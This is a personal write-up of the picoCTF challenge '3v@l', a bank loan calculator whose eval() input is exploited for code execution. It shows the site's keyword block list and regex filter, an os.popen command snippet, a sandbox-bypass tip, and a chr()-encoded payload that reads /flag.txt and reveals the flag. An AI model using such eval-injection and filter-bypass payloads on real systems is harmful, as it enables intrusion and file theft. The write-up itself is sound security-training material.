# picoGym Level 484: 3v@l
Source: https://play.picoctf.org/practice/challenge/484

## Goal
ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank.<br>
Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE).<br>
Can you exploit the bank's calculator and read the flag?<br>
The website is running Here.<br>
http://shape-facility.picoctf.net:55132/

## What I learned
```
built-in function                                       dunder/magic method
__import__("os")                                        __init__ (constructor)
                                                        __str__ (string conversion)
                                                        __len__ (length of object)

AsianHacker-picoctf@webshell:~$ python3 -c 'print(__import__("os").popen("id").read())'
uid=10000(AsianHacker-picoctf) gid=10000(AsianHacker-picoctf) groups=10000(AsianHacker-picoctf)

# BASH                                              # Python
cat /flag.txt                                       open("/flag.txt").read() 👀 Bypass malicous keyword filter
                                                    # C
                                                    FILE *f = fopen("/flag.txt", "r");
                                                    fread(buf, 1, sizeof(buf), f);
                                                    # php
                                                    echo file_get_contents("/flag.txt");
                                                    # Node.js
                                                    const fs = require("fs");
                                                    console.log(fs.readFileSync("/flag.txt", "utf8"));

Note: / character is filtered by regex (can’t pass it in plain text)
AsianHacker-picoctf@webshell:~$ python3 -c "print(ord('/'))"
47
ASCII mappings for /flag.txt:
chr(47) → /                 ord('/') = 47
chr(102) → f                ord('f') = 102
chr(108) → l                ord('l') = 108
chr(97) → a                 ord('a') = 97
chr(103) → g                ord('g') = 103
chr(46) → .                 ord('.') = 46
chr(116) → t                ord('t') = 116
chr(120) → x                ord('x') = 120
chr(116) → t                ord('t') = 116

Test:
Input: open(chr(47)).read()
Output: Result: Error: [Errno 21] Is a directory: '/'

Payload:
open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
```             

## Side Quest Python 🧠🧠🧠🧠🧠
```
Python Standard Library Modules
System & OS
    os                          file system, environment, process management ⭐
    sys                         interpreter info, command-line args, exit
    shutil                      file operations (copy, move, delete)
    subprocess                  spawn new processes / run shell commands ⭐
    pathlib                     object-oriented file paths

Math & Numbers
    math                        math functions (sin, cos, sqrt)
    random                      random numbers, choices, shuffling
    decimal                     precise decimal arithmetic
    fractions                   rational numbers
    statistics                  mean, median, mode

Data Structures & Utilities
    collections                 Counter, deque, defaultdict, OrderedDict
    heapq                       priority queues / heaps
    itertools                   combinatorics, permutations, iterators
    functools                   reduce, lru_cache, partial

Text & String Processing
    re                          regular expressions
    string                      constants like ascii_letters, digits
    textwrap                    wrapping / formatting text
    difflib                     string similarity / diffing

Dates & Time
    datetime                    date, time, timedelta
    time                        timestamps, sleep, performance counter
    calendar                    calendars, leap years

File Formats & Serialization
    json                            parse / dump JSON
    csv                             read/write CSV files
    pickle                          Python object serialization
    xml.etree.ElementTree           XML parsing
    configparser                    INI file parsing

Networking & Web
    socket                          raw networking
    http.client                     HTTP requests
    urllib                          URL handling (request, parse)
    ftplib, smtplib                 FTP / email

Security & Hashing
    hashlib                         MD5, SHA hashing
    hmac                            keyed-hash message authentication
    ssl                             secure sockets layer

Debugging & Introspection
    inspect                         analyze objects, functions, source code
    pdb                             interactive debugger
    traceback                       stack traces

Miscellaneous
    argparse                        command-line arguments
    logging                         logs / debug info
    warnings                        custom warnings
    threading / multiprocessing     concurrency

# Note: __import__() + subprocess or os.popen() can bypass some restrictions in sandboxed Python environments ❤️

# Built-in functions (Python 3)
Input / Output
    print()                         outputs text to console
    input()                         reads user input
    open()                          opens a file
Type Conversion
    int(), float(), complex()       convert to numbers
    str(), repr()                   convert to string
    bool()                          convert to boolean
    list(), tuple(), set(), dict()  create/convert collections
Math & Numbers
    abs()                           absolute value
    round()                         round number
    pow(x, y)                       x ** y
    divmod(x, y)                    returns (quotient, remainder)
    sum(), min(), max()             operations on iterables
Iterables & Functional Programming
    len()                           length of a sequence
    range()                         generates a sequence of numbers
    enumerate()                     index + value iteration
    zip()                           combine multiple iterables
    map(), filter(), sorted(), reversed()
    any(), all()                    truth checks
Object Introspection
    type()                          get type of an object
    id()                            unique identifier (memory address-ish)
    dir()                           list attributes/methods of object
    vars()                          dict of object’s attributes
    help()                          built-in doc system
    isinstance(obj, cls)            type check
    issubclass(sub, super)          class inheritance check
Miscellaneous
    hash()                          get hash value
    eval()                          evaluate Python expression (dangerous in CTFs)
    exec()                          execute Python code dynamically
    globals(), locals()             current variable scopes
    __import__()                    import module by string name
    callable()                      check if object is callable
```

## Solution
```
https://webshell.picoctf.org/

# Test Python
Input: print("Hi") ⌨️
Result: None
Input: print(__import__("os").popen("id").read()) ⌨️
Error: Detected forbidden keyword 'os'.

Input: 2 + 2 ⌨️
Output: 4
Input: ls ⌨️
Error: Detected forbidden keyword 'ls'.

# View Page Source
<!DOCTYPE html>
<html lang="en">
<!--
    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind 👀
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.' 👀
-->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to ABC bank </title>
    <link rel="stylesheet" href="/static/bootstrap.min.css">
    <link rel="stylesheet" href="/static/styles.css">
</head>
<body>
    <div class="container">
        <h1 class="mb-4 text-center">Bank-Loan Calculator</h1>
        <form method="post" action="/execute">
            <div class="form-group">
                <label for="code">Enter the formula:</label>
                <textarea id="code" name="code" class="form-control" rows="10" cols="50" placeholder="example: PRT*RATE*TIME(10000*23*12)" required></textarea>
            </div>
            <button type="submit" class="btn btn-primary">Execute</button>
        </form>
        <div class="footer-link mt-4">
            <a href="/">Go back</a>
        </div>
    </div>
</body>
</html>

Input: \x2f ⌨️
Output: Error: Detected forbidden keyword ''.
Input: chr(47) ⌨️
Output: /

# Input Payload
Input: open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read() ⌨️
Result: picoCTF{D0nt_Use_Unsecure_f@nctions5e20166b}
```

## Flag
picoCTF{D0nt_Use_Unsecure_f@nctions5e20166b}

## Continue
[Continue](./picoGym0296.md)